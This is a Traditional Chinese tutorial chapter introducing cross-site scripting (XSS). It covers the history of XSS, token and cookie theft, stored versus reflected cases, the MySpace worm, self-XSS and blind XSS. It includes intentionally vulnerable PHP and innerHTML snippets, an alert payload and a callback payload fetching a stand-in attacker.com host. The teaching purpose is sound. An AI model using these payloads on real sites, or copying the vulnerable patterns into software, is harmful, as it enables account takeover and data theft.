---
sidebar_position: 3
---

# 前端資安還是得從 XSS 開始談起才對味

在第一篇的序言裡面我有提到前端安全不只有 XSS，還有許多很有趣的東西，但其實光是 XSS 本身就很有趣，也是許多人認知中的「前端資安」，因此還是不免俗地得從 XSS 開始談起。雖然談論 XSS 的文章已經有了很多，但其實 XSS 本身就是一個可以寫 30 天鐵人賽的主題，因此，或許你還是可以從我的文章中學到一些以前沒注意過的事情。

從這篇開始，就讓我們正式進入第一個章節：「從 XSS 開始談前端資安」。

## XSS 的起源

微軟的 MSDN 部落格在 2009 年發表了一篇名為：[Happy 10th birthday Cross-Site Scripting!](https://web.archive.org/web/20100723152801/http://blogs.msdn.com/b/dross/archive/2009/12/15/happy-10th-birthday-cross-site-scripting.aspx) 的文章，由此可見 XSS 的誕生應該是 1999 年左右，已經是上一個世紀了。

![](pics/03-01.png)

雖然說文章的最後有這樣一段話，希望十年後 XSS 能夠慶祝 XSS 的「死亡」：

> Let’s hope that ten years from now we’ll be celebrating the death, not the birth, of Cross-Site Scripting!

但我們都知道，就算已經過了 20 年，XSS 都還是相當熱門的漏洞，從名不見經傳的小公司網站一直到眾所皆知的超大公司 Facebook 或是 Google，都還是偶爾會有 XSS 的漏洞出現，由此可見要防禦這個攻擊是沒有這麼容易的。

接著，我們就來看一下 XSS 是什麼東西。

## XSS 是什麼？可以做到哪些事情？

XSS 的全名為 Cross-site scripting，之所以不叫 CSS 是因為它已經是 Cascading Style Sheets 的縮寫，因此就取叫 XSS 了。

這個名稱從現在的角度看來其實不太對，因為很多 XSS 並不只是「Cross-site」，這個我之後會講到 site 跟 origin 的差別，到時候再提吧！這也是前端資安中非常重要的知識。

簡單來說呢，XSS 就代表著攻擊者可以在其他人的網站上面執行 JavaScript 程式碼。

舉例來說，假設有個網站是這樣寫的：

``` php
<?php
 echo "Hello, " . $_GET['name'];
?>
```

我只要瀏覽 `index.php?name=huli`，頁面上就會出現：「Hello, huli」，看起來十分正常。

但如果我瀏覽的是 `index.php?name=<script>alert(1)</script>` 呢？輸出的內容就變成了：

``` html
Hello, <script>alert(1)</script>
```

`<script>` 裡面的內容就會被當成是 JavaScript 程式碼來執行，畫面上就跳出了一個 alert 視窗，代表著我可以在其他人的網站裡面執行 JavaScript 程式碼。

雖然說大部分的 XSS 範例都是執行 `alert(1)` 來證明可以執行程式碼，但可千萬別認為 XSS 的用途只有這樣而已，這只是為了方便示範而已。

一旦達成了 XSS，就等於可以在別人的網站上執行程式碼，所以可以做到很多事情，例如說偷取所有 `localStorage` 裡面的東西，這裡面可能會有身份驗證用的 token，偷到 token 以後，就可以用其他人的身份登入網站了。

這就是為什麼有些人倡導身份驗證用的 token 應該存在 cookie 而非 `localStorage`，因為 `localStorage` 會被偷，但是 cookie 如果有加上 `HttpOnly` 這個 flag 的話，是完全碰不到的，因此就不會被偷。

若是網站剛好沒有使用 `HttpOnly` 這個 flag，可以利用 `document.cookie` 或是更新的 `cookieStore` API 來拿到該網站的 cookie。就算真的偷不到，也可以直接使用 `fetch()` 來呼叫 API，就可以看看網站上有哪些功能可以操作。

例如說 YouTube 有 XSS 的漏洞好了，攻擊者就可以利用這個漏洞新增影片、刪除影片或是偷取觀看紀錄跟後台數據等等，基本上只要是正常操作可以做到的事情，攻擊者都做得到。

你有想過為什麼有很多網站改密碼的時候，都需要再輸入一次現在的密碼嗎？不是都已經登入過了，幹嘛還要再輸入一次？難不成我在改密碼的時候會不知道自己的密碼嗎？

你絕對知道自己的密碼，但是攻擊者不知道。

以改密碼這個功能來說，後端可能會提供一支叫做 `/updatePassword` 的 API，需要提供 `currentPassword` 跟 `newPassword` 這兩個參數，通過身份驗證後即可更改密碼。

就算攻擊者找到並利用了 XSS 漏洞，他也沒辦法更改你的密碼，因為他不知道你現在的密碼是什麼。

反之，如果改密碼的時候不需要 `currentPassword`，那攻擊者就可以利用 XSS 直接把你的密碼改掉，把你整個帳號都拿過來。透過 XSS 拿到的 auth token 有時間限制，到了就會過期，但如果攻擊者直接改你的密碼，就能用你的帳號密碼光明正大的登入。

因此有許多敏感操作都會需要再輸入一次密碼或甚至是有第二組密碼，目的之一就是為了防禦這種狀況。

## XSS 的來源

之所以會有 XSS 的問題，就是因為直接在頁面上顯示了使用者的輸入，導致使用者可以輸入一個惡意的 payload 並植入 JavaScript 程式碼。

你可能有聽過 XSS 的幾種分類，像是 Reflect、Persistant 跟 DOM-based 等等，但這些分類方式也已經二十幾年了，我覺得不太適用於今天的情境，因此我認為可以從兩個角度去看 XSS。

### 1. 內容是如何被放到頁面上的

例如說剛剛提到的 PHP 的例子，攻擊者的內容就是直接在後端就輸出了，因此瀏覽器收到 HTML 時，裡面就已經有了 XSS 的 payload。

再舉一個不同的例子，底下是一個 HTML 檔案：

``` html
<div>
  Hello, <span id="name"></span>
</div>
<script>
  const qs = new URLSearchParams(window.location.search)
  const name = qs.get('name')
  document.querySelector('#name').innerHTML = name
</script>
```

一樣可以透過 `index.html?name=<script>alert(1)</script>` 的方式置入任何我們想要的內容，但這次就是從前端去輸出內容，是透過 `innerHTML` 的方式把我們的 payload 新增到頁面上。

這有什麼差呢？

差別就是上面的例子其實不會跳出 alert，原因是在使用 `innerHTML` 時，插入的 `<script>` 是沒有效果的，因此攻擊者必須調整 XSS payload 才能執行程式碼。

### 2. Payload 有沒有被儲存

剛剛舉的例子都是直接拿 query string 的內容呈現在頁面上，因此攻擊的 payload 並沒有被儲存在任何地方。

所以如果要攻擊的話，我們必須想辦法讓目標去點擊這個帶有 XSS payload 的連結，才能觸發我們的攻擊。當然，也可以透過其他方式或是結合其他手法降低這個門檻，例如說用短網址讓對方看不出來異樣之類的。

在這種狀況下，基本上你的攻擊對象就是這一個人。

而有另外一種狀況就比較簡單了，比如說留言板好了，假設留言裡面可以插入 HTML 程式碼而且沒有做任何的過濾，那我們可以留一個帶有 `<script>` 標籤的內容，如此一來，任何觀看這個留言板的人都會受到攻擊，你的攻擊對象是所有使用者，影響範圍就更大了。

你想想，假設 Facebook 的貼文有 XSS 漏洞，那所有看到貼文的人都會被攻擊，甚至可以把這個攻擊變成 wormable 的，意思就是像蠕蟲一樣可以自我複製，利用 XSS 去幫受害者發文，這樣就有更多的人會遭受到攻擊。

在 2008 年的一篇 OWASP 的論文 [Building and Stopping Next Generation XSS Worms](https://owasp.org/www-pdf-archive/OWASP-AppSecEU08-Dabirsiaghi.pdf) 中就提到了幾個 worm XSS 的案例。

最知名的真實案例是 2005 年知名社群網站 MySpace，一位名叫 Samy Kamkar 的 19 歲少年找到了 profile 頁面的 XSS 漏洞，利用漏洞讓受害者把自己加為好友，然後把受害者的 profile 也植入 XSS payload，結果在 18 個小時內感染了超過 100 萬的使用者，導致 MySpace 暫時關閉網站來清除這些受感染的 profile。

從這個案例就可以知道 worm XSS 的影響力了。

除了用「payload 的來源」分類 XSS 以外，還有別的方式也可以分類 XSS，底下會額外介紹兩種特殊的 XSS 的分類，雖然比較不常見但還是可以知道一下。

### Self-XSS

Self-XSS 其實有兩種解釋，第一種是「自己攻擊自己」，例如說你打開網頁的開發者工具，然後自己貼上 JavaScript 程式碼，就是一種 self-xss。有些網站會特別警告你不要這樣做，像是 Facebook：

![](pics/03-02.png)

第二種解釋是「只能攻擊到自己的 XSS」，通常也被稱為 self-XSS。

我們前面所提的 XSS 都是攻擊別人用的，因為別人看得到你的 payload，但有些時候只有自己看得到。

舉一個例子好了，假設現在是電話號碼的欄位有 XSS 漏洞，但問題是電話號碼屬於個人隱私資料，所以只有在你自己的設定頁面看得到，別人是看不到的。像這種狀況就是 self-XSS，只有你自己打開設定頁面時看得到 `alert()` 的彈出視窗。

雖然看起來沒什麼用，但跟其他漏洞串接之後，有可能別人就看得到了。

## Blind XSS

Blind XSS 的意思就是「XSS 在你看不到的地方以及不知道的時間點被執行了」。

照樣舉個例子，假設現在有個電商平台，你測試過後發現每個欄位都沒有問題，沒有找到 XSS 的漏洞。但是呢，其實電商自己有個內部的後台，可以看到所有訂單資料，而這個後台是有漏洞的，忘了對姓名做編碼，因此可以用姓名這個欄位來執行 XSS。

以這種情況來說，我們一般在測試的時候是不會知道的，因為我沒有存取後台的權限，甚至也不知道後台的存在。想要測試這種狀況的話，就需要把 XSS payload 的內容從 `alert()` 改成一個會傳送封包的 payload，例如說 `fetch('https://attacker.com/xss')`，這樣子當 XSS 在看不見的地方觸發時，就可以從 server 觀察到。

有一些現成的服務如 [XSS Hunter](https://github.com/mandatoryprogrammer/xsshunter-express) 就提供了一個平台讓你更方便去觀察 XSS 有沒有被觸發，有觸發的話會回傳觸發的 URL 以及畫面上其他的東西等等。

講到實際案例的話，rioncool22 在 2020 年時向 Shopify 回報了一個漏洞：[Blind Stored XSS Via Staff Name](https://hackerone.com/reports/948929)，他在 Shopify 的商家後台新增了一名員工，並且在姓名的欄位插入了 XSS payload，雖然在 Shopify 商家後台沒有觸發，但是在 Shopify 自己的內部後台卻觸發了，最後拿到了 3000 塊美金的賞金。

## 小結

這篇是針對 XSS 的基本介紹，主要著重在 XSS 可能造成的影響以及成因，也順便介紹了 self-XSS 與 blind XSS 這兩個分類。

這還只是 XSS 的開端而已，下一篇我們會繼續往下探索，看到更多 XSS 不同的樣貌。

在進入到下一篇之前，大家可以先想想看如果你找到一個注入點是 `innerHTML = data`，你會用什麼 payload 去觸發 XSS？

